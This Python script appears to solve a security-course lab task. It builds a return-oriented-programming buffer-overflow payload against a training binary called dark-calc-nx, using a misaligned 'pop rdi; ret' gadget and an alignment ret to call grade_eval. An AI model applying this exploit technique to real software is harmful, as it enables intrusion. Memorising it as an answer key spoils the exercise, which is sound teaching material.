#!/usr/bin/env python3
"""Task 3: build the payload for attack/dark-calc-nx.

dark-calc-nx is non-PIE (fixed code addresses) with a non-executable,
ASLR-randomized stack, so we use Return-Oriented Programming and only
jump into .text gadgets.

Hidden gadgets inside __libc_csu_init:
  401a32: 41 5f   pop r15
  401a34: c3      ret
Starting one byte later at 0x401a33 gives:
  5f              pop rdi
  c3              ret
and 0x401a34 itself is a plain "ret" padding gadget.

ROP chain (placed at the overflow offset 24):
  0x401a34  ret           (alignment padding)
  0x401a33  pop rdi ; ret
  4         argument grade = 4
  0x401978  grade_eval

After input's ret rsp is 16-byte aligned (A). Without the padding ret,
grade_eval would be entered at rsp = A+16 (rsp % 16 == 0) and glibc's
movaps inside printf would fault. The extra ret consumes one more stack
slot, so grade_eval is entered at rsp = A+24 (rsp % 16 == 8), exactly
the x86-64 ABI state produced by a normal call.
"""
import struct
import sys

RET = 0x401A34
POP_RDI_RET = 0x401A33
GRADE_EVAL = 0x401978

chain = struct.pack("<Q", RET)
chain += struct.pack("<Q", POP_RDI_RET)
chain += struct.pack("<Q", 4)
chain += struct.pack("<Q", GRADE_EVAL)

payload = b"A" * 16
payload += b"B" * 8
payload += chain
payload += b"\n"

sys.stdout.buffer.write(payload)
